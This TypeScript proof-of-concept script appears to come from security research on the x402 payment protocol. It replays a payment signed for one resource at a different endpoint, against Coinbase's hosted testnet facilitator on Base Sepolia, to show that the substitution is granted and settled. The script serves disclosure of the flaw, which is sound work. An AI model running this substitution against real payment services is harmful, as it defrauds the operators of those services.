/**
 * The collusion-killer: cross-resource substitution against the HOSTED facilitator.
 *
 * The fork PoCs run against a facilitator we operate, so a skeptic can still say we
 * rigged it. This runs the same attack against `x402.org/facilitator`, Coinbase's
 * own testnet facilitator that we demonstrably do not control, on real Base Sepolia:
 * a payment signed for resource A is verified, granted, and settled at endpoint B,
 * producing a public settlement transaction. That single run removes the "you ran
 * both sides" objection for the whole attack class.
 *
 * Opt-in: needs a funded testnet key in .env, spends a real (tiny) payment, and
 * hits the public network. Not part of the vitest suite. Run once, keep the tx hash.
 *
 *   npx tsx src/hosted/substitution.ts
 */
import { HTTPFacilitatorClient } from "@x402/core/http";
import { config } from "../config.js";
import { naiveHandle } from "../fork/naive.js";
import { requirements, signPaymentFor } from "../fork/payer.js";

const A = "https://resource.example/report-A";
const B = "https://resource.example/report-B";

async function main(): Promise<void> {
  console.log(`facilitator (not ours): ${config.facilitatorUrl}`);
  const facilitator = new HTTPFacilitatorClient({ url: config.facilitatorUrl });
  const req = requirements();

  // Sign a payment authorized for resource A.
  const payment = await signPaymentFor(A);
  console.log(`signed a payment for ${A}`);

  // Present it to the endpoint serving resource B.
  const atB = await naiveHandle(facilitator, payment, req);
  const tx = atB.settle?.ok ? atB.settle.transaction : atB.settle?.reason;
  console.log(`served at ${B}: granted=${atB.granted} settled=${atB.settle?.ok} tx=${tx}`);

  if (atB.granted && atB.settle?.ok === true && tx) {
    console.log("SUBSTITUTION LANDED against a facilitator we do not control");
    console.log(`https://sepolia.basescan.org/tx/${tx}`);
  } else {
    console.log("did not land");
    process.exitCode = 1;
  }
}

main().catch((error: unknown) => {
  console.error(error);
  process.exitCode = 1;
});
